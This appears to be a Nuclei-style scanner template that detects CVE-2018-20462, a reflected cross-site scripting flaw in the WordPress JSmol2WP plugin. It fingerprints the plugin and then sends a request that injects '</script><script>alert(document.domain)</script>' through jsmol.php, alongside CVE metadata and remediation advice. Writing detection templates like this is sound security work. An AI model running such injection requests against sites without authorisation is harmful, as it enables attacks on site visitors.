flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    internal: true
    type: word
    words:
    - JSmol2WP
    - 'Tags:'
  raw:
  - 'GET /wp-content/plugins/jsmol2wp/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8'
id: CVE-2018-20462
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:jsmol2wp_project:jsmol2wp:1.07:*:*:*:*:wordpress:*:*
    cve-id: CVE-2018-20462
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.81141
    epss-score: 0.01584
  description: WordPress JSmol2WP version 1.07 and earlier is vulnerable to cross-site
    scripting and allows remote attackers to inject arbitrary web script or HTML via
    the jsmol.php data parameter.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: jsmol2wp
    vendor: jsmol2wp_project
  name: WordPress JSmol2WP <=1.07 - Cross-Site Scripting
  reference:
  - https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt
  - https://wpvulndb.com/vulnerabilities/9196
  - https://nvd.nist.gov/vuln/detail/CVE-2018-20462
  - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update to the latest version of the WordPress JSmol2WP plugin (1.08
    or higher) to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2018,cve,wordpress,xss,wp-plugin,jsmol2wp_project,vuln
